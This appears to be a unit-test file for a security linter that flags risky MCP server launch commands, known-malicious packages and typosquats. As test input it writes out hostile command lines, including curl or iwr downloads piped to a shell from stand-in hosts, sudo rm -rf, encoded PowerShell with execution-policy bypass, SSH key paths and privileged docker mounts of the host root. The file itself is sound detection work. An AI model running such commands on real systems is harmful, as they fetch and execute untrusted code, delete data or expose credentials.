"""What a server's launch command runs and what is risky about it (agent_sentinel/launch.py, advisories.py)."""

import base64
import hashlib
import os
import tempfile
import time
import unittest
from pathlib import Path
from unittest import mock

import support  # noqa: F401  (puts the project folder on sys.path)
from agent_sentinel import advisories, launch
from agent_sentinel.launch import (
    advisory_findings,
    launch_identity,
    launch_risks,
    runner_package,
    typosquat_of,
    version_before,
    within_one_edit,
)

HOME = "C:/Users/me" if os.name == "nt" else "/home/me"


def risks(*words):
    return launch_risks(list(words), user_home=HOME)


class InlineCode(unittest.TestCase):
    def test_interpreters_given_code_on_the_command_line(self):
        for words, flag in (
            (("sh", "-c", "echo hi"), "sh -c"),
            (("/bin/bash", "--login", "-lc", "x"), "bash -lc"),
            (("cmd", "/c", "npx", "x@1.0.0"), "cmd /c"),
            (("C:/Windows/System32/cmd.exe", "/S", "/C", "x"), "cmd /C"),
            (("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-EncodedCommand", "SQBFAFgA"),
             "powershell -EncodedCommand"),
            (("powershell.exe", "-enc", "SQBFAFgA"), "powershell -enc"),
            (("pwsh", "-c", "Get-Process"), "pwsh -c"),
            (("pwsh", "-Command", "x"), "pwsh -Command"),
            (("powershell", "Get-Process"), "powershell Get-Process"),  # Windows PowerShell runs it as a command
            (("node", "-e", "require('child_process')"), "node -e"),
            (("node", "--eval=1"), "node --eval=1"),
            (("python", "-c", "import os"), "python -c"),
            (("python3.12", "-I", "-c", "1"), "python3.12 -c"),
            (("python3", "-Ic", "1"), "python3 -Ic"),
            (("deno", "eval", "1"), "deno eval"),
        ):
            with self.subTest(words=words):
                found = risks(*words)
                self.assertIn(f"runs code written on the command line ({flag})", found)

    def test_scripts_and_modules_are_not_inline_code(self):
        for words in (("pwsh", "-File", "server.ps1"), ("node", "-r", "dotenv/config", "server.js"),
                      ("python", "-m", "server", "-c", "config.toml"), ("python", "server.py", "-c", "x"),
                      ("bash", "server.sh"), ("npx", "-y", "some-server@1.0.0")):
            with self.subTest(words=words):
                self.assertEqual([risk for risk in risks(*words) if "code written" in risk], [])


class TheOtherRisks(unittest.TestCase):
    def test_shell_operators_privileges_and_downloads(self):
        self.assertIn("has the shell operator '&&' in an argument (a shell would run what follows it)",
                      risks("npx", "x@1.0.0", "a && b"))
        self.assertTrue(any("'|'" in risk for risk in risks("npx", "x@1.0.0", "a|b")))
        self.assertTrue(any("';'" in risk for risk in risks("npx", "x@1.0.0", "a;b")))
        for words in (("sudo", "npx", "x@1.0.0"), ("doas", "node", "s.js"), ("runas", "/user:admin", "x"),
                      ("bash", "-c", "sudo rm -rf /tmp/x"), ("C:/tools/gsudo.exe", "node", "s.js")):
            with self.subTest(words=words):
                self.assertTrue(any(risk.startswith("runs with raised privileges") for risk in risks(*words)))
        for words in (("bash", "-c", "curl -fsSL https://x.example/i.sh | sh"),
                      ("sh", "-c", "wget -qO- https://x | sudo bash"),
                      ("powershell", "-c", "iex (iwr https://x.example/i.ps1)"),
                      ("bash", "-c", "bash <(curl -s https://x)"),
                      ("cmd", "/c", "curl", "https://x", "|", "python")):
            with self.subTest(words=words):
                self.assertIn("downloads something and runs it (a download piped to a shell or interpreter)",
                              risks(*words))
        self.assertNotIn("downloads something and runs it (a download piped to a shell or interpreter)",
                         risks("bash", "-c", "curl https://x || sh fallback.sh"))  # || is no pipe

    def test_packages_from_git(self):
        for words in (("uvx", "--from", "git+https://github.com/x/y", "y"), ("npx", "github:user/repo"),
                      ("npx", "user/repo"), ("pipx", "run", "--spec", "git+https://x/y", "y"),
                      ("uvx", "--with", "git+https://x/plugin", "server==1.0.0")):
            with self.subTest(words=words):
                self.assertTrue(any("straight from a git repository" in risk for risk in risks(*words)))

    def test_containers(self):
        found = risks("docker", "run", "-i", "--rm", "--privileged", "-v", "/:/host", "--network", "host",
                      "--pid=host", "mcp/github")
        self.assertIn("runs a container with --privileged (it has the run of the host)", found)
        self.assertIn("mounts a whole drive (the root folder) into the container (-v /:/host)", found)
        self.assertIn("shares the host's network with the container (--network host)", found)
        self.assertIn("shares the host's pid with the container (--pid host)", found)
        self.assertTrue(any("the image mcp/github by a tag, not pinned by digest" in risk for risk in found))
        self.assertEqual(risks("docker", "run", "-i", "--rm", "-e", "TOKEN", "ghcr.io/x/y@sha256:" + "a" * 64), [])
        self.assertTrue(any("mounts the whole home folder" in risk
                            for risk in risks("podman", "run", "--mount", f"type=bind,source={HOME},target=/h",
                                              "img@sha256:" + "b" * 64)))
        self.assertTrue(any("mounts a whole drive" in risk
                            for risk in risks("docker", "container", "run", "-v", "C:\\:/host", "img@sha256:1")))
        self.assertEqual(risks("docker", "run", "--privileged=false", "img@sha256:1"), [])

    def test_arguments_that_name_credentials_a_drive_or_the_home_folder(self):
        self.assertTrue(any("names a credential or client configuration file" in risk
                            for risk in risks("npx", "x@1.0.0", f"{HOME}/.ssh/id_rsa")))
        self.assertTrue(any("claude_desktop_config.json" in risk
                            for risk in risks("node", "s.js", "--config=C:/x/claude_desktop_config.json")))
        for root in ("/", "C:\\", "C:/", "D:"):
            with self.subTest(root=root):
                self.assertIn(f"gives the server a whole drive (the root folder) in an argument ({root})",
                              risks("npx", "@modelcontextprotocol/server-filesystem@2025.7.1", root))
        for folder in (HOME, "~", f"--root={HOME}"):
            with self.subTest(folder=folder):
                self.assertTrue(any(risk.startswith("gives the server the whole home folder")
                                    for risk in risks("npx", "x@1.0.0", folder)))
        self.assertEqual(risks("npx", "x@1.0.0", f"{HOME}/projects/app"), [])

    def test_a_plain_launch_has_no_risk(self):
        for words in (("npx", "-y", "@modelcontextprotocol/server-memory@2025.8.4"), ("node", "C:/srv/server.js"),
                      ("uvx", "mcp-server-fetch==2025.4.7"), ("python", "-m", "my_server")):
            with self.subTest(words=words):
                self.assertEqual(risks(*words), [])

    def test_hostile_text_is_printable(self):
        found = risks("sh", "-c", "x\x1b[2J", "a&&b\x1b]0;t\x07")
        self.assertFalse(any("\x1b" in risk or "\x07" in risk for risk in found))

    def test_hostile_commands_stay_fast(self):
        long_words = ["--/bash"] * 4000 + ["-x"] * 4000  # every word an interpreter, every one followed by options
        big = ["sh", "-c", "curl " * 200_000 + "| " * 10_000]
        piped = ["bash", "-c", "|".join(["curl x"] * 50_000)]
        nested = ["bash", "-c", "; ".join(["bash -c 'sh -c \"cmd /c npx -y x\"'"] * 400)]
        for words in (long_words, big, piped, nested, ["docker", "run", *(["-v", "/a:/b"] * 3000), "img"],
                      ["bash"] + ["-" + "o" * 5000] * 4095,  # options that take values, of a shell
                      ["node", "x.js"] + ["/" + ".ssh/" * 2000] * 400):  # 4 MB that looks like credential paths
            started = time.perf_counter()
            launch_risks(words, user_home=HOME)
            runner_package(words)
            launch_identity("C:/x/" + words[0], words)
            self.assertLess(time.perf_counter() - started, 2)

    def test_an_entry_as_large_as_a_configuration_is_checked_and_printed_quickly(self):
        from agent_sentinel.cli_doctor import full_command, launch_lines
        for words in (["node", "x.js"] + ["a" * 2000] * 2000,  # 4 MB, the largest configuration read
                      ["sh", "-c", "curl " + "x" * 4_000_000 + " | sh"],
                      ["node", "x.js"] + ["é" * 1000 + "a" * 1000] * 200):
            started = time.perf_counter()
            lines = launch_lines(words)
            self.assertLess(time.perf_counter() - started, 3)
            self.assertTrue(lines[-1].text.endswith(full_command(words[-1:])))  # in full, never cut short
        from agent_sentinel.cli_common import shell_line
        from agent_sentinel.leaks import redact
        from agent_sentinel.textutil import printable
        for words in (["a\x1b[2Jb", "é\u0301\u0301\u0301", "plain", "C:\\x y\\z", 'say "hi"', ""],
                      ["a b\\", 'x\\"y', 'q\\\\"', "tab\there\\\\", '"', "\\"],
                      ["--token", "ghp_abcdefghijklmnopqrstuvwxyz0123456789", "\u200b\x07"]):
            with self.subTest(words=words):  # the quick way gives what printable() does, letter by letter
                self.assertEqual(full_command(words), printable(redact(shell_line(words)), limit=10**6))
        self.assertIn("a\\x1b[2Jb", full_command(["a\x1b[2Jb"]))

    def test_a_command_longer_than_any_real_one_is_said_to_be(self):
        words = ["node", "x.js", "a" * launch.MAX_LINTED_CHARS, f"{HOME}/.ssh/id_rsa"]
        found = risks(*words)
        self.assertTrue(any(risk.startswith(f"is longer than {launch.MAX_LINTED_CHARS} characters") for risk in found))
        self.assertFalse(any(risk.startswith("names a credential") for risk in found))  # past the part read
        self.assertEqual(risks("node", "x.js", "a" * 1000), [])


class SimpleVariantsAreFlagged(unittest.TestCase):
    """Spellings that once slipped past the lint (shell options with values, clusters, docker's own options)."""

    def test_shell_options_before_c_and_node_clusters(self):
        for words, flag in ((("bash", "-o", "errexit", "-c", "x"), "bash -c"),
                            (("bash", "--rcfile", "/dev/null", "-c", "x"), "bash -c"),
                            (("bash", "-O", "extglob", "-c", "x"), "bash -c"),
                            (("bash", "+o", "history", "-euo", "pipefail", "-c", "x"), "bash -c"),
                            (("node", "-pe", "x"), "node -pe"), (("node", "-ep", "x"), "node -ep")):
            with self.subTest(words=words):
                self.assertIn(f"runs code written on the command line ({flag})", risks(*words))
        for words in (("bash", "-o", "errexit", "server.sh"), ("node", "-v"), ("node", "--check", "s.js")):
            with self.subTest(words=words):
                self.assertEqual([risk for risk in risks(*words) if "code written" in risk], [])

    def test_docker_options_before_run_and_options_not_known_here(self):
        found = risks("docker", "--context", "default", "run", "--privileged", "-v", "/:/host", "img")
        self.assertIn("runs a container with --privileged (it has the run of the host)", found)
        self.assertIn("mounts a whole drive (the root folder) into the container (-v /:/host)", found)
        self.assertTrue(any(risk.startswith("runs the image img by a tag") for risk in found))
        self.assertIn("runs a container with --privileged (it has the run of the host)",
                      risks("docker", "-H", "unix:///var/run/docker.sock", "run", "--privileged", "img@sha256:1"))
        digest = "img@sha256:" + "c" * 64
        for words in (("docker", "run", "--pids-limit", "100", digest),  # a known option with a value
                      ("docker", "run", "--some-new-limit", "100", digest),  # an unknown one, followed by a number
                      ("podman", "run", "--some-new-path", "/srv/x", "--rm", digest)):
            with self.subTest(words=words):
                self.assertEqual([risk for risk in risks(*words) if "runs the image" in risk], [])
        self.assertTrue(any("runs the image mcp/x:1 by a tag" in risk
                            for risk in risks("docker", "run", "--pids-limit", "100", "mcp/x:1")))

    def test_other_spellings_of_a_drive_or_the_home_folder(self):
        for value in ("/.", "/./", "C:\\.", "C:/.", "/tmp/..", "\\."):
            with self.subTest(value=value):
                self.assertIn(f"gives the server a whole drive (the root folder) in an argument ({value})",
                              risks("npx", "x@1.0.0", value))
        self.assertTrue(any("mounts a whole drive" in risk
                            for risk in risks("docker", "run", "-v", "/.:/host", "img@sha256:1")))
        for value in ("$HOME/", "$HOME", "${HOME}/.", "~/", "~/.", "%USERPROFILE%\\", f"{HOME}/", f"{HOME}/."):
            with self.subTest(value=value):
                self.assertTrue(any(risk.startswith("gives the server the whole home folder")
                                    for risk in risks("npx", "x@1.0.0", value)), value)
        for value in ("//server/share", "\\\\server\\share", "$HOME/projects", "~user", "./x", "C:.", "C:x"):
            with self.subTest(value=value):
                self.assertEqual(risks("npx", "x@1.0.0", value), [])


class BehindWrappers(unittest.TestCase):
    """The commands a launch runs behind cmd /c, env, sh -c, powershell -Command, sudo, wsl (DOC-1)."""

    def test_the_commands_behind_a_wrapper(self):
        npx = ["npx", "-y", "x@1.0.0"]
        encoded = base64.b64encode("npx -y x@1.0.0".encode("utf-16-le")).decode("ascii")
        for words, expected in (
            (["cmd", "/c", *npx], [npx]),
            (["C:\\Windows\\System32\\cmd.exe", "/d", "/s", "/c", "npx -y x@1.0.0"], [npx]),
            (["cmd", "/cnpx", "-y", "x@1.0.0"], [npx]),
            (["env", "-i", "-u", "HOME", "A=1", "B=2", *npx], [npx]),
            (["env", "-S", "npx -y", "x@1.0.0"], [npx]),
            (["env", "--", *npx], [npx]),
            (["bash", "-c", "cd /srv && FOO=1 exec npx -y x@1.0.0"], [["cd", "/srv"], npx]),
            (["bash", "-o", "errexit", "-lc", "npx -y 'x@1.0.0'"], [npx]),
            (["powershell", "-NoProfile", "-Command", *npx], [npx]),
            (["pwsh", "-enc", encoded], [npx]),
            (["powershell.exe", "npx -y x@1.0.0"], [npx]),
            (["sudo", "-u", "root", "--", *npx], [npx]),
            (["wsl", "-d", "Ubuntu", "-e", *npx], [npx]),
            (["wsl", *npx], [npx]),
            (["runas", "/user:admin", "npx -y x@1.0.0"], [npx]),
            (["cmd", "/c", "bash", "-c", "npx -y x@1.0.0"], [npx]),
            (["cmd", "/c", "C:\\Program Files\\nodejs\\npx.cmd", "-y", "x@1.0.0"],
             [["C:\\Program Files\\nodejs\\npx.cmd", "-y", "x@1.0.0"]]),
            (npx, [npx]),
            (["bash", "server.sh"], [["bash", "server.sh"]]),
            (["cmd", "/c"], []),
            (["env", "A=1"], []),
        ):
            with self.subTest(words=words):
                self.assertEqual(launch.commands_run(list(words)), expected)

    def test_the_packages_behind_a_wrapper_and_the_other_runners(self):
        for words, expected in (
            (("cmd", "/c", "npx", "-y", "postmark-mcp@1.0.16"), ("npx", "postmark-mcp", "1.0.16")),
            (("cmd.exe", "/c", "npx -y postmark-mcp"), ("npx", "postmark-mcp", None)),
            (("env", "npx", "-y", "postmark-mcp"), ("npx", "postmark-mcp", None)),
            (("bash", "-c", "npx -y postmark-mcp@1.0.17"), ("npx", "postmark-mcp", "1.0.17")),
            (("npm", "exec", "--yes", "postmark-mcp"), ("npm exec", "postmark-mcp", None)),
            (("npm", "x", "--", "postmark-mcp@1.0.16"), ("npm exec", "postmark-mcp", "1.0.16")),
            (("pnpm", "dlx", "postmark-mcp"), ("pnpm dlx", "postmark-mcp", None)),
            (("pnpx", "postmark-mcp"), ("pnpm dlx", "postmark-mcp", None)),
            (("yarn", "dlx", "-p", "postmark-mcp@1.0.16", "postmark"), ("yarn dlx", "postmark-mcp", "1.0.16")),
            (("bun", "x", "postmark-mcp"), ("bunx", "postmark-mcp", None)),
            (("npx", "-y", "npm:postmark-mcp@1.0.16"), ("npx", "postmark-mcp", "1.0.16")),
            (("npx", "-y", "mail@npm:postmark-mcp@1.0.16"), ("npx", "postmark-mcp", "1.0.16")),
            (("sudo", "uvx", "mcp-server-git==2025.1.1"), ("uvx", "mcp-server-git", "2025.1.1")),
        ):
            with self.subTest(words=words):
                ref = runner_package(list(words))
                self.assertEqual((ref.runner, ref.name, ref.version), expected)
                self.assertTrue(advisory_findings(ref) or ref.name != "postmark-mcp")
        found = launch.runner_packages(["bash", "-c", "npx -y a-server@1.0.0 && npx -y mcp-remote@0.1.15"])
        self.assertEqual([ref.written for ref in found], ["npx a-server@1.0.0", "npx mcp-remote@0.1.15"])
        self.assertEqual(launch.unpinned_package(["cmd", "/c", "npx", "-y", "some-mcp"]),
                         ("some-mcp", "some-mcp@1.2.3"))
        for words in (("npm", "start"), ("pnpm", "exec", "x"), ("yarn", "x"), ("cmd", "/c", "node", "s.js")):
            with self.subTest(words=words):
                self.assertIsNone(runner_package(list(words)))

    def test_what_is_behind_a_wrapper_is_bounded(self):
        deep = ["npx", "-y", "x@1.0.0"]
        for _ in range(launch.MAX_WRAPPERS + 2):
            deep = ["cmd", "/c", *deep]
        self.assertEqual(launch.runner_packages(deep), [])  # too deep to look behind: nothing is assumed
        self.assertTrue(any("cmd /c" in risk for risk in risks(*deep)))  # still inline code
        many = ["bash", "-c", " ; ".join(f"npx -y p{number}-server@1.0.0" for number in range(100))]
        self.assertEqual(len(launch.commands_run(many)), launch.MAX_COMMANDS)
        self.assertLessEqual(len(launch.runner_packages(many)), launch.MAX_COMMANDS)
        long_string = ["bash", "-c", "npx -y x@1.0.0 " + "a" * 100_000]
        self.assertEqual(runner_package(long_string).name, "x")  # the start of a long string is still read


class Packages(unittest.TestCase):
    def test_the_package_a_runner_runs(self):
        for words, expected in (
            (("npx", "-y", "mcp-remote@0.1.16"), ("npm", "mcp-remote", "0.1.16", "registry")),
            (("npx.cmd", "-p", "@scope/pkg@1.2.3", "run-it"), ("npm", "@scope/pkg", "1.2.3", "registry")),
            (("bunx", "Some-Pkg@latest"), ("npm", "some-pkg", None, "registry")),
            (("uvx", "--from", "Mcp_Server.Git==2026.1.14", "mcp-server-git"),
             ("pypi", "mcp-server-git", "2026.1.14", "registry")),
            (("uv", "tool", "run", "mcp-server-fetch@2025.4.7"), ("pypi", "mcp-server-fetch", "2025.4.7", "registry")),
            (("pipx", "run", "--spec", "fastmcp==2.0.0", "fastmcp"), ("pypi", "fastmcp", "2.0.0", "registry")),
            (("npx", "./local/server"), ("npm", "", None, "path")),
            (("npx", "https://x.example/p.tgz"), ("npm", "", None, "url")),
            (("uvx", "git+https://x/y"), ("pypi", "", None, "git")),
        ):
            with self.subTest(words=words):
                ref = runner_package(list(words))
                self.assertEqual((ref.ecosystem, ref.name, ref.version, ref.source), expected)
        for words in (("node", "server.js"), ("npx",), ("uvx", "--from"), ("pipx", "install", "x"), ()):
            with self.subTest(words=words):
                self.assertIsNone(runner_package(list(words)))

    def test_versions_compare_as_numbers_with_pre_releases_first(self):
        self.assertTrue(version_before("0.1.15", "0.1.16"))
        self.assertTrue(version_before("0.1.9", "0.1.16"))
        self.assertFalse(version_before("0.1.16", "0.1.16"))
        self.assertTrue(version_before("0.1.16-rc.1", "0.1.16"))
        self.assertFalse(version_before("0.1.16+build.5", "0.1.16"))
        self.assertTrue(version_before("0.6.2", "2025.7.1"))
        self.assertFalse(version_before("2026.1.14.post1", "2026.1.14"))
        self.assertTrue(version_before("v1.2", "1.2.1"))
        self.assertIsNone(version_before("latest", "1.0.0"))

    def test_malware_fails_and_vulnerable_versions_warn(self):
        def levels(*words):
            return [level for level, _ in advisory_findings(runner_package(list(words)))]

        self.assertEqual(levels("npx", "-y", "postmark-mcp@1.0.16"), ["fail"])
        self.assertEqual(levels("npx", "postmark-mcp@1.0.18"), ["fail"])
        self.assertEqual(levels("npx", "postmark-mcp"), ["fail"])  # may fetch a malicious version
        self.assertEqual(levels("npx", "postmark-mcp@^1.0.0"), ["fail"])
        self.assertEqual(levels("npx", "postmark-mcp@1.0.15"), ["warn"])
        self.assertEqual(levels("npx", "mcp-remote@0.1.15"), ["warn"])
        self.assertEqual(levels("npx", "mcp-remote@0.1.16"), [])
        self.assertEqual(levels("npx", "mcp-remote"), [])  # the newest has the fix (the unpinned warning is doctor's)
        self.assertEqual(levels("npx", "@modelcontextprotocol/inspector@0.14.0"), ["warn"])
        self.assertEqual(levels("npx", "@modelcontextprotocol/server-filesystem@2025.3.28"), ["warn"])
        self.assertEqual(levels("npx", "@modelcontextprotocol/server-filesystem@2025.7.1"), [])
        self.assertEqual(levels("uvx", "mcp-server-git==2025.12.18"), ["warn"])
        self.assertEqual(levels("uvx", "MCP_Server_Git==2025.9.25"), ["warn"])
        self.assertEqual(levels("uvx", "mcp-server-git==2026.1.14"), [])
        self.assertEqual(levels("npx", "mcp-server-git@1.0.0"), [])  # another registry, another package
        text = advisory_findings(runner_package(["npx", "mcp-remote@0.1.15"]))[0][1]
        self.assertIn("CVE-2025-6514", text)
        self.assertIn("fixed in 0.1.16", text)

    def test_the_advisories_are_data_with_a_date_and_well_formed(self):
        self.assertRegex(advisories.LAST_UPDATED, r"\A\d{4}-\d\d-\d\d\Z")
        self.assertIn("GOES STALE", advisories.__doc__)
        for advisory in advisories.MALICIOUS:
            self.assertTrue(advisory.first_bad and not advisory.fixed and advisory.source.startswith("https://"))
        for advisory in advisories.VULNERABLE:
            self.assertTrue(advisory.fixed and not advisory.first_bad and advisory.source.startswith("https://"))
            self.assertIsNotNone(version_before("0.0.1", advisory.fixed))

    def test_typosquats(self):
        for words, popular in ((("npx", "mcp-remot@1.0.0"), "mcp-remote"), (("npx", "mcp-rmeote"), "mcp-remote"),
                               (("npx", "mcp-remotee"), "mcp-remote"),
                               (("npx", "@modelcontextprotocol/server-filesytem"),
                                "@modelcontextprotocol/server-filesystem"),
                               (("npx", "modelcontextprotocol/server-memory"), None),  # a GitHub repository to npm
                               (("uvx", "mcp-server-gti"), "mcp-server-git"),
                               (("uvx", "mcp_server_fech==1.0.0"), "mcp-server-fetch")):
            with self.subTest(words=words):
                self.assertEqual(typosquat_of(runner_package(list(words))), popular)
        for words in (("npx", "mcp-remote@0.1.16"), ("npx", "@someone/server-filesystem"), ("npx", "abc"),
                      ("uvx", "mcp-server-git"), ("npx", "@modelcontextprotocol/server-everything")):
            with self.subTest(words=words):
                self.assertIsNone(typosquat_of(runner_package(list(words))))

    def test_no_two_popular_names_are_one_edit_apart(self):
        for ecosystem, names in advisories.POPULAR.items():
            for one in names:
                for other in names:
                    with self.subTest(one=one, other=other):
                        self.assertFalse(one != other and within_one_edit(one, other))

    def test_one_edit(self):
        for one, other in (("abc", "abd"), ("abc", "ab"), ("abc", "abcd"), ("abc", "acb"), ("abc", "xabc")):
            with self.subTest(one=one, other=other):
                self.assertTrue(within_one_edit(one, other))
                self.assertTrue(within_one_edit(other, one))
        for one, other in (("abc", "abc"), ("abc", "cba"), ("abc", "a"), ("abcd", "badc")):
            with self.subTest(one=one, other=other):
                self.assertFalse(within_one_edit(one, other))


class WhatAServerPinHolds(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.folder = Path(self.tmp.name).resolve()

    def test_a_script_is_pinned_by_its_sha256(self):
        script = self.folder / "server.js"
        script.write_bytes(b"console.log(1)")
        identity = launch_identity("C:/nodejs/node.exe", ["node", "--no-warnings", "server.js"], cwd=str(self.folder))
        self.assertEqual(identity["script"], str(script))
        self.assertEqual(identity["script_sha256"], hashlib.sha256(b"console.log(1)").hexdigest())
        self.assertIsNone(identity["package"])
        self.assertEqual(identity["executable"], os.path.abspath("C:/nodejs/node.exe"))

    def test_a_runner_is_pinned_by_its_package_and_a_program_by_its_own_file(self):
        identity = launch_identity("C:/nodejs/npx.cmd", ["npx", "-y", "mcp-remote@0.1.16", "https://x"])
        self.assertEqual((identity["package"], identity["script"]), ("npx mcp-remote@0.1.16", None))
        program = self.folder / "server.exe"
        program.write_bytes(b"MZ...")
        identity = launch_identity(str(program), [str(program), "--stdio"])
        self.assertEqual(identity["script_sha256"], hashlib.sha256(b"MZ...").hexdigest())
        for words in (["python", "-m", "server"], ["python", "-c", "x"], ["cmd", "/c", "x"], ["docker", "run", "i"]):
            with self.subTest(words=words):
                self.assertIsNone(launch_identity("C:/x/" + words[0], words)["script"])

    def test_behind_a_wrapper_the_package_or_script_is_pinned(self):
        identity = launch_identity("C:/Windows/System32/cmd.exe", ["cmd", "/c", "npx", "-y", "mcp-remote@0.1.16"])
        self.assertEqual(identity["package"], "npx mcp-remote@0.1.16")  # so a new version is seen at the start
        script = self.folder / "server.js"
        script.write_bytes(b"console.log(2)")
        for words in (["cmd", "/c", "node", "server.js"], ["env", "NODE_ENV=production", "node", "server.js"],
                      ["bash", "-c", "exec node server.js"]):
            with self.subTest(words=words):
                identity = launch_identity("C:/x/" + words[0], words, cwd=str(self.folder))
                self.assertEqual((identity["script"], identity["script_sha256"]),
                                 (str(script), hashlib.sha256(b"console.log(2)").hexdigest()))
        both = launch_identity("C:/x/bash", ["bash", "-c", "npx -y a-srv@1.0.0 && node server.js"],
                               cwd=str(self.folder))
        self.assertEqual((both["package"], both["script"]), ("npx a-srv@1.0.0", None))  # two commands: no one script
        many = launch_identity("C:/x/bash", ["bash", "-c", " ; ".join(f"npx -y {'p' * 200}{n}@1.0.0"
                                                                      for n in range(10))])
        self.assertRegex(many["package"], r"\Asha256:[0-9a-f]{64}\Z")  # too long to keep as it is

    def test_uv_run_and_a_runner_of_scripts_pin_the_script(self):
        server = self.folder / "server.py"
        server.write_bytes(b"print(1)")
        sub = self.folder / "srv"
        sub.mkdir()
        (sub / "main.py").write_bytes(b"print(2)")
        ts = self.folder / "server.ts"
        ts.write_bytes(b"export {}")
        for words, expected in (
            (["uv", "run", "server.py"], server),
            (["uv", "run", "--with", "mcp", "--", "server.py"], server),
            (["uv", "--directory", "srv", "run", "main.py"], sub / "main.py"),
            (["uv", "run", "--directory=srv", "python", "-u", "main.py"], sub / "main.py"),
            (["npx", "-y", "tsx@4.19.0", "server.ts"], ts),
            (["npx", "-y", "-p", "tsx@4.19.0", "tsx", "--no-warnings", "server.ts"], ts),
            (["cmd", "/c", "npx", "-y", "tsx@4.19.0", "server.ts"], ts),
        ):
            with self.subTest(words=words):
                identity = launch_identity("C:/x/" + words[0], words, cwd=str(self.folder))
                self.assertEqual(identity["script"], str(expected))
                self.assertEqual(identity["script_sha256"], hashlib.sha256(expected.read_bytes()).hexdigest())
        self.assertEqual(launch_identity("C:/x/npx", ["npx", "-y", "tsx@4.19.0", "server.ts"],
                                         cwd=str(self.folder))["package"], "npx tsx@4.19.0")
        for words in (["uv", "run", "mcp-server"], ["uv", "run", "-m", "server"], ["uv", "sync"],
                      ["uv", "tool", "run", "mcp-server-fetch==1.0.0"], ["npx", "-y", "some-server@1.0.0", "x.ts"]):
            with self.subTest(words=words):
                self.assertIsNone(launch_identity("C:/x/" + words[0], words, cwd=str(self.folder))["script"])

    def test_a_file_that_cannot_be_read_or_is_too_large_has_no_sha256(self):
        self.assertIsNone(launch.file_sha256(str(self.folder / "missing.js")))
        self.assertIsNone(launch.file_sha256(str(self.folder)))
        big = self.folder / "big.bin"
        big.write_bytes(b"x" * 100)
        with mock.patch.object(launch, "MAX_HASHED_BYTES", 10):
            self.assertIsNone(launch.file_sha256(str(big)))


if __name__ == "__main__":
    unittest.main()
